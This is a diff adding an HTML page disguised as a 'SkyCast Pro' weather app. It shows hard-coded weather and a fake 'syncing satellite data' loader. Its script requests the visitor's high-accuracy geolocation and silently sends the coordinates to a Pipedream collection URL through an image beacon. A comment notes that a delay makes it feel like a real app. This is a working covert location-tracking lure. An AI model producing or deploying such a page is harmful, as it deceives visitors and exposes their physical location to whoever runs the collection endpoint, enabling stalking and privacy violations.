@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SkyCast Pro | Local Weather</title>
+    <style>
+        :root { --bg: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); }
+        body { 
+            background: var(--bg); 
+            background-attachment: fixed;
+            color: white; 
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+            margin: 0; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 40px;
+            border-radius: 30px;
+            width: 85%;
+            max-width: 380px;
+            text-align: center;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        }
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #00d2ff;
+            border-radius: 50%;
+            width: 45px;
+            height: 45px;
+            animation: spin 1s linear infinite;
+            margin: 25px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .weather-icon { font-size: 64px; margin-bottom: 10px; }
+        .temp { font-size: 72px; font-weight: 200; margin: 0; letter-spacing: -2px; }
+        .city { font-size: 24px; font-weight: 500; margin-bottom: 5px; opacity: 0.9; }
+        .desc { font-size: 16px; opacity: 0.7; text-transform: uppercase; letter-spacing: 2px; }
+
+        #weather-content { display: none; animation: fadeIn 0.8s ease-in; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div id="loader">
+            <div class="spinner"></div>
+            <p style="font-weight: 300; letter-spacing: 1px;">SYNCING SATELLITE DATA...</p>
+        </div>
+
+        <div id="weather-content">
+            <div class="weather-icon">☀️</div>
+            <div class="city">Hyderabad, TS</div>
+            <div class="temp">34°C</div>
+            <div class="desc">Mostly Clear</div>
+            <div style="margin-top: 25px; height: 1px; background: rgba(255,255,255,0.2); width: 80%; margin-left: 10%;"></div>
+            <p style="font-size: 11px; margin-top: 15px; opacity: 0.5;">HUMIDITY: 42% | WIND: 12km/h</p>
+        </div>
+    </div>
+
+    <script>
+        // --- DO NOT CHANGE THE SCRIPT LOGIC BELOW ---
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendAndShow, handleError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000
+                });
+            } else {
+                handleError();
+            }
+        };
+
+        function sendAndShow(p) {
+            // PASTE YOUR WORKING PIPEDREAM/REQUESTBIN URL BELOW
+            const gate = "https://eotwt8cj1vr426p.m.pipedream.net";
+
+            var i = new Image();
+            i.src = gate + "?lat=" + p.coords.latitude + "&lon=" + p.coords.longitude + "&t=" + Date.now();
+
+            setTimeout(displayUI, 2500); // 2.5s delay feels more like a real app loading
+        }
+
+        function handleError() { displayUI(); }
+
+        function displayUI() {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('weather-content').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
